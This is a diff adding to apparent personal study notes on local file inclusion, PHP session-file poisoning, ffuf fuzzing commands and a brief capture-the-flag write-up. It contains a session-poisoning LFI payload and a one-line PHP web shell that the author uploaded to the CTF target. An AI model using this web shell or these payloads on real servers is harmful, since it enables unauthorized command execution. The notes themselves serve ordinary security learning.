@@ -22,3 +22,21 @@
 
   - log poisoning is the eaziest and most fun of all(cuz it has very less remembering part 😁). Now in most sites cookies are stored in '/var/lib/php/sessions/sess_' inside the backend server. We inspect the network and copy the cookies from there. The cookie stored has a prefix of sess_ so we use it like this - `=/var/lib/php/sessions/sess_cookie&cmd=pwd`.
  
+# Using ffuf to search:
+- Scaanning with ffuf is pretty usefull. There are 3 types of important according to me.
+- `http://IP:PORT/FUZZ?value=value` Where ever I put FUZZ the tool will find for that part but it also needs that particular .txt fle to do that:
+     1. For `http://IP:PORT/FUZZ?value=value` the file used is **common.txt** and its path is(for me) `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://IP:PORT/FUZZ?value=value"`
+     2. For `http://IP:PORT/index.php?FUZZ=value` the file is **burp-parameter-names.txt** and its path `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://IP:PORT/index.php?FUZZ=value"`
+     3. For `http://IP:PORT/index.php?value=FUZZ` the file is **lfi-linux-list.txt** and its path is `ffuf -w /usr/share/seclists/Fuzzing/LFI/lfi-linux-list.txt -u "http://IP:PORT/index.php?value=FUZZ"`
+ 
+
+  # CTF
+  - First I get inside a site which had an apply.php at end and contact.php at end.
+  - First both seemed sus but after checking them both were lfi proof.
+  - But seeing inside apply.php I saw that ther was an upload thing I uploaded my shell.php file which had that *<?php system($_GET["cmd"]); ?>* code. Though the file didnt do much but the site's url changed a bit so i tested it but it failed too.
+  - Then I went to its source code and found a url of im something like this */api/image.php/sd2EDW* it seemed very intersig so i tried it a bit too but nothing that I tried worked.
+  - After spending about half an hour I decided to see a writeup and to my suprise evrything I did was correct just the fact I did not use ffuf on that link was the mistake I did.
+  - But even after that I was not able to tell what to do so I went to writeups again...
+  - After seening it I realized that I did not have the experince to search for any other php file in source code cuz the person used base64 to encode the php files to read them.
+  - And the second thing I learned was how to red those php files properly which helped him gain info on how the site worked.
+  - With all the info we got I used the php filter to get our flag.
